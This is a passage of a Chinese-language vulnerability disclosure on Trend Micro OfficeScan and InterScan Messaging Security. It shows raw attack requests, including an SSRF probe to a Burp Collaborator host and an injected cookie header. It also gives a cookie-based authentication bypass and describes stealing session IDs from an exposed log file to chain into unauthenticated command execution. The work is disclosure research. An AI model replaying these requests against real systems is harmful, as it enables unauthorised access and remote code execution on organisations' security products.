        X-Requested-With: XMLHttpRequest
        X-Request: JSON
        X-CSRFToken: o6qjdkto700a43nfslqpjl0rm5
        Content-type: application/x-www-form-urlencoded; charset=utf-8
        Referer: https://12.0.0.200:8445/widget/index.php
        Content-Length: 192
        Cookie: JSESSIONID=C2DC56BE1093D0232440A1E469D862D3; CurrentLocale=en-US; PHPSESSID=o6qjdkto700a43nfslqpjl0rm5; un=7164ceee6266e893181da6c33936e4a4; userID=1;; wids=modImsvaSystemUseageWidget%2CmodImsvaMailsQueueWidget%2CmodImsvaQuarantineWidget%2CmodImsvaArchiveWidget%2C; lastID=4; cname=dashBoard; theme=default; lastTab=3; trialGroups=newmenu%0D%0AX-Footle:%20bootle
        X-Forwarded-For: 127.0.0.1
        True-Client-Ip: 127.0.0.1
        Connection: close
        module=modSimple&userGenerated=1&serverid=1&url=http://azdrkpoar6muaemvbglzqxzbg2mtai.burpcollaborator.net/
**漏洞＃6 – 认证绕过漏洞（0day）**
****
前面说过，核心系统是用Java/.NET编写的，但是这个widget系统是用PHP实现的。所以，这里最大的问题是：
当请求到达widget时，它们怎样才能知道用户已经通过了身份验证呢？
回答这个问题的最简单的方法是，跟踪Burp日志，检查用户是否了登陆了视图仪表板，因为登陆是通过widget进行的。以下HTTP POST请求引起了我的注意。
        POST /officescan/console/html/widget/ui/modLogin/talker.php HTTP/1.1
        Host: 12.0.0.175
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Cookie: session_expired=no;; LogonUser=root; wf_CSRF_token=c7ce6cd2ab50bd787bb3a1df0ae58810
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Length: 59
        X-CSRFToken: c7ce6cd2ab50bd787bb3a1df0ae58810
        Content-Type: application/x-www-form-urlencoded
        cid=1&act=check&hash=425fba925bfe7cd8d80a8d5f441be863&pid=1
以下代码便是取自该文件。
       if(!WF::getSecurityFactory()->getHttpToken()->isValidHttpHeaderToken()){
          make_error_response(WF_ERRCODE_HTTP_HEADER_TOKEN_ERR, WF_ERRCODE_HTTP_HEADER_TOKEN_ERR_MSG);
          exit();
        }
        // ... CODE OMIT ...
        if( $_REQUEST['act'] == "check" ) {
            mydebug_log("[LOGIN][check]");
            if( (!isset($_REQUEST['hash']) || $_REQUEST['hash'] == "") ) {
              make_error_response( LOGIN_ERRCODE_LACKINPUT, LOGIN_ERRCODE_LACKINPUT_MSG."(email)");
              exit;
            }
            // check user state
            $recovered = false;
            if( STANDALONE_WF ) {
              mydebug_log("[LOGIN][check] recover session STANDALONE");
              $recovered = $wfuser->standalone_user_init();
            } else {
              mydebug_log("[LOGIN][check] recover session PRODUCT");
              $recovered = $wfuser->product_user_init();
            }
            if( $recovered == false ) {
              mydebug_log("[LOGIN][check] recover session failed");
              make_error_response( LOGIN_ERRCODE_LOGINFAIL, LOGIN_ERRCODE_LOGINFAIL_MSG);
              exit;
            }
            mydebug_log("[LOGIN][check] recover session ok");
            /*
             * return the widgets of only first tab
             */
            $ckresult = $wfuser->check_result($_REQUEST['pid'],$_REQUEST['cid']);
            if( $ckresult == false ) {
              make_error_response( LOGIN_ERRCODE_DBERR, LOGIN_ERRCODE_DBERR_MSG);
            } else {
              mydebug_log("[LOGIN][check] check result: ".$ckresult);
              make_successful_response( LOGIN_OK_SUCCESS_MSG, $ckresult);
            }
            exit;
          }
首先，我们在这里进行的是CSRF验证。但重要的代码位于17-23行之间。 $wfuser->
standalone_user_init()和$wfuser->
product_user_init()负责使用widget框架进行身份验证。下面，让我们从第一个调用开始介绍。
这里有4个内部函数调用序列。
     public function standalone_user_init(){
            mydebug_log("[WFUSER] standalone_user_init()");
            if(isset($_COOKIE['userID'])){
                return $this->recover_session_byuid($_COOKIE['userID']);
            }
            mydebug_log("[WFUSER] standalone_user_init(): cookie userID isn't set");
            return false;
        }
        public function recover_session_byuid($uid){
            mydebug_log("[WFUSER] recover_session_byuid() " . $uid);
            if(false == $this->loaduser_byuid($uid)){
                mydebug_log("[WFUSER] recover_session_byuid() failed");
                return false;
            }
            return $this->recover_session();
        }
        public function loaduser_byuid($uid){
            mydebug_log("[WFUSER] loaduser_byuid() " . $uid);
            // load user
            $uinfolist = $this->userdb->get_users($uid);
            if($this->userdb->isFailed()){
                return false;
            }
            // no exists
            if(! isset($uinfolist[0])){
                return false;
            }
            // get userinfo
            $this->userinfo = $uinfolist[0];
            return true;
        }
        public function get_users($uid = null){
            // specify uid
            $work_uid = $this->valid_uid($uid);
            if($work_uid == null){
                return;
            }
            // query string
            $sqlstring = 'SELECT * from ' . $this->users_table . ' WHERE id = :uid';
            $sqlvalues[':uid'] = $work_uid;
            return $this->runSQL($sqlstring, $sqlvalues, "Get " . $this->users_table . " failed", 1);
        }
上述代码分别执行以下操作。
1\. 从cookie获取相应的值
2\. 调用loaduser_byuid()并将相应的值传递给该函数。
3\. 用给定的值调用get_users()函数。
如果该函数返回true，它将返回true，从而让前面的函数继续并调用recover_session()函数。
4\. get_users()函数将利用给定的唯一id执行SQL查询。
$wfuser-> product_user_init()函数序列几乎没有什么变化。 $wfuser->
standalone_user_init()和$wfuser->
product_user_init()之间的唯一区别就是第一个函数使用user_id，而第二个函数则使用username。
我在这里没有看到任何身份验证。甚至连hash参数都没有使用。所以使用相同的变量调用这个端点将顺利通过身份验证。
**一个漏洞搞定所有产品（Metasploit Module）**
****
现在我们发现了两个漏洞。第一个是最近修补的命令注入漏洞，第二个是widget系统的身份验证绕过漏洞。如果将这些漏洞组合起来，我们就能在没有任何身份凭证的情况下执行操作系统的命令。
下面是相应的metasploit模块的演示。 ()
相同的代码/漏洞：趋势科技InterScan Messaging Security产品的RCE漏洞
在这个widget框架方面，InterScan Messaging Security和OfficeScan的区别之一就是..路径！
OfficeScan的widget框架路径：
**https://TARGET/officescan/console/html/widget/proxy_controller.php**
IMSVA widget 框架的路径:
**https://TARGET:8445/widget/proxy_controller.php**
另一个主要区别就是widget认证。对于talker.php来说，IMSA稍微有些不同，具体如下所示。
        if(!isset($_COOKIE["CurrentLocale"]))
        {
            echo $loginscript;
            exit;
        }
        $currentUser;
        $wfsession_checkURL="Https://".$_SERVER["SERVER_ADDR"].":".$_SERVER["SERVER_PORT"]."/WFSessionCheck.imss";
        $wfsession_check = new WFHttpTalk();
        $wfsession_check->setURL($wfsession_checkURL);
        $wfsession_check->setCookies($_COOKIE);
        if(isset($_COOKIE["JSESSIONID"]))
            mydebug_log("[product_auth] JSEEEIONID:".$_COOKIE["JSESSIONID"]);
        $wfsession_check->Send();
        $replycode = $wfsession_check->getCode();
        mydebug_log("[product_auth]reply code-->".$replycode);
        $replybody = $wfsession_check->getBody();
        mydebug_log("[product_auth]reply body-->".$replybody);
        if($replycode != 200)
        {  
        mydebug_log("[product_auth] replycode != 200");
        echo $loginscript;
        exit;
        }
它从用户那里取得JSESSIONID的值，然后使用这个值向WFSessionCheck.imss发送HTTP请求，在那里通过核心Java应用进行用户身份验证。看起来，这好像能够防止上面发现的身份验证绕过漏洞，但实际上并非如此。为此，我们需要仔细研读上面的代码：即使请求中不存在JSESSIONID的时候，上述代码也会使用JSESSIONID来调用mydebug_log()函数。
请注意，该日志文件是可通过Web服务器公开访问的。
    https://12.0.0.201:8445/widget/repository/log/diagnostic.log
所以，要想利用OfficeScan中的漏洞的话，我们只需要添加一个额外的步骤即可。也就是说，我们需要读取这个日志文件的内容，以便提取有效的JSESSIONID值，然后利用它来绕过身份验证。
下面是相应的metasploit模块的演示。 ()
**小结**
首先，我想再次重申，趋势科技已经为这两种产品中的命令注入漏洞提供了安全补丁。 因此，如果您是趋势科技用户，或您的组织正在使用这些产品的话，请立刻行动起来。
当然，在不同的产品中使用相同的代码库并不是什么坏事。本文只是想指出，在这种情况下，框架中的一个bug就可能会引起很大的麻烦。
那么，到底有多少不同的产品受这个漏洞影响呢？
我不知道，因为目前仅仅检查了这两个产品。当然，如果有时间的话，我还会检查其他产品。